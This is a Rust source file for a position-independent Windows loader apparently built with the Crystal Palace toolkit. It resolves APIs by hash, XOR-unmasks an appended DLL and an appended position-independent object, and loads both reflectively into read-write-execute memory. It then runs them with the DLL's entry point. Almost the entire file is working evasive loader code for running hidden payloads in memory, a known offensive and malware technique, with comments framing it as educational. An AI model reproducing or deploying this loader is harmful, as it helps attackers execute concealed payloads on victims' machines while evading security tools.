#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! { loop {} }

use core::{ffi::{c_void}, mem, panic::PanicInfo, ptr::null_mut};

use crystal_palace_rs::{append_data, get_resource, import};
use crystal_palace_sys::tcg::{DLLDATA, EntryPoint, IMPORTFUNCS, LoadDLL, ParseDLL, PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, ProcessImports, SizeOfDLL, findFunctionByHash, findModuleByHash};
use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};

#[unsafe(no_mangle)]
pub extern "C" fn resolve(mod_hash: u32, func_hash: u32) -> FARPROC {
    unsafe {
        let h_module = findModuleByHash(mod_hash);
        findFunctionByHash(h_module, func_hash)
    }
}

append_data!(my_data, findAppendedDLL);
append_data!(my_bof, findAppendedPICO);
append_data!(my_key, findAppendedKey);

import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(KERNEL32!VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD) -> i32);
import!(LoadLibraryA(arg1: LPCSTR) -> HMODULE);
import!(GetProcAddress(arg1: HMODULE, arg2: LPCSTR) -> FARPROC);

type PicoMainFunc3 = unsafe extern "C" fn(loader: *const c_void, dll_entry: *const c_void, dll_base: *const c_void);

fn xor(src: &[u8], dst: *mut u8, key: &[u8]) {
    for (i, byte) in src.iter().enumerate() {
        unsafe { *dst.add(i) = byte ^ key[i % key.len()] };
    }
}

/*
    This version does not emit panic functions in the binary. While the object size is significantly smaller than the safe version
    the final binary size after crystal palace linking is the same. I thought it would be good to keep this in here for educational
    purposes to inform about "safe rust code" and the final binary abnd also incase anybody has this requirement
*/
unsafe fn _no_panic_xor(src: &[u8], dst: *mut u8, key: &[u8]) {
    let mut j = 0usize;
    let p_src = src.as_ptr();
    let p_key = key.as_ptr();
    for i in 0..src.len() {
        unsafe { *dst.add(i) = *p_src.add(i) ^ *p_key.add(j)};

        j += 1;
        if j == key.len() {
            j = 0;
        }
    }
}

fn unmask(src_data: *const u8) -> *mut u8 {
    unsafe {
        let src = get_resource(src_data);
        let key = get_resource(findAppendedKey());
        let dst;

        /* allocate memory for our unmasked content */
        dst = VirtualAlloc(null_mut(), src.len(), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE) as *mut u8;
        //dprintf(c"ALLOC %p (%d bytes)".as_ptr() as _, dst, src.len());

        /* unmask it */
        xor(src, dst, key);

        dst
    }
}

fn run_via_free_coff(funcs: &mut IMPORTFUNCS, dll_entry: *const c_void, dll_base: *const c_void) {
    unsafe {
        let mut src = findAppendedPICO();
        let dst_code;
        let dst_data;
        let entry;

        /* unmask our PICO! */
        src = unmask(src);

        /* allocate memory for our PICO */
        dst_data = VirtualAlloc( null_mut(), PicoDataSize(src as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
        dst_code = VirtualAlloc( null_mut(), PicoCodeSize(src as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

        /* load our pico into our destination address, thanks! */
        PicoLoad(funcs, src as _, dst_code as _, dst_data as _);

        /* grab our entry point, the last thing we need from our unmasked PICO */
        entry = PicoEntryPoint(src as _, dst_code as _).unwrap_unchecked();

        /* now that our pico is loaded, let's free the buffer with the unmasked PICO content */
        //dprintf(c"free %p".as_ptr() as _, src);
        VirtualFree(src as _, 0, MEM_RELEASE);

        /* execute our pico */
        mem::transmute::<_, PicoMainFunc3>(entry)(go as _, dll_entry, dll_base);
    };

}

#[unsafe(no_mangle)]
extern "C" fn go() {
    unsafe { 
        let mut src= findAppendedDLL();     /* find our DLL appended to this PIC */
        let dst;
        let mut data: DLLDATA = mem::zeroed();

        /* setup our IMPORTFUNCS data structure */
        let mut funcs = IMPORTFUNCS { 
            LoadLibraryA: Some(LoadLibraryA_ptr()), 
            GetProcAddress: Some(GetProcAddress_ptr()) 
        };

        /* unmask our DLL data */
        src = unmask(src);
 
        /* parse our DLL! */
        ParseDLL(src as _, &mut data);

        /* load the damned thing */
        dst = VirtualAlloc( null_mut(), SizeOfDLL(&mut data) as usize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        /* load the damned thing */
        LoadDLL(&mut data, src as _, dst as _);

        /* setup our IMPORTFUNCS data structure */
        ProcessImports(&mut funcs, &mut data, dst as _);

        /* pass to our BOF */
        run_via_free_coff(&mut funcs, EntryPoint(&mut data, dst as _).unwrap_unchecked() as _, dst as _);
    };
}